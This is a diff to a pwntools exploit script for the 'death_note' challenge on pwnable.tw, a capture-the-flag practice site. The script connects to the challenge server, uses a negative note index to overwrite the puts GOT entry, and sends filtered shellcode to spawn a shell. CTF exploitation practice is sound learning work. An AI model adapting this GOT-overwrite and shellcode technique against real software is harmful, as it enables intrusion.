@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 from pwn import *
 
-exe = './chall32'
+exe = './death_note'
 elf = context.binary = ELF(exe)
 # libc = ELF("")
 
@@ -13,22 +13,23 @@ def start(argv=[], *a, **kw):
         return process([exe] + argv, *a, **kw)
 
 gdbscript = '''
-    b* main+118
+    b* add_note+145
 '''.format(**locals())
 
 #===========================================================
 #                    EXPLOIT GOES HERE
 #===========================================================
 
-p = start()
+# p = start()
+p = remote("chall.pwnable.tw", 10201)
 
-# p.recvuntil(b" :")
-# p.sendline(b"1")
-# p.recvuntil(b" :")
-# p.sendline(b"-16") # puts@got
-# p.recvuntil(b" :")
+p.recvuntil(b" :")
+p.sendline(b"1")
+p.recvuntil(b" :")
+p.sendline(b"-16") # puts@got
+p.recvuntil(b" :")
 
-# address = 0x0804b1a0
+address = 0x0804b1a0
 
 '''
 eax = 0x0b
@@ -48,10 +49,6 @@ edx = 0
 *ESP  0xffffcf9c —▸ 0x80487f4 (add_note+165) ◂— add esp, 0x10
 *EIP  0x804b1a0 ◂— 'BBBB'
 '''
-
-bob = asm("""
-    mov edx, eax
-    """)
 
 shellcode = asm("""
     push 0x41
@@ -118,7 +115,7 @@ for i in shellcode:
         print("Bad shellcode", chr(i), shellcode.index(i))
         exit()
 
-p.sendline(bob + shellcode)
+p.sendline(shellcode)
 
 p.interactive()
 
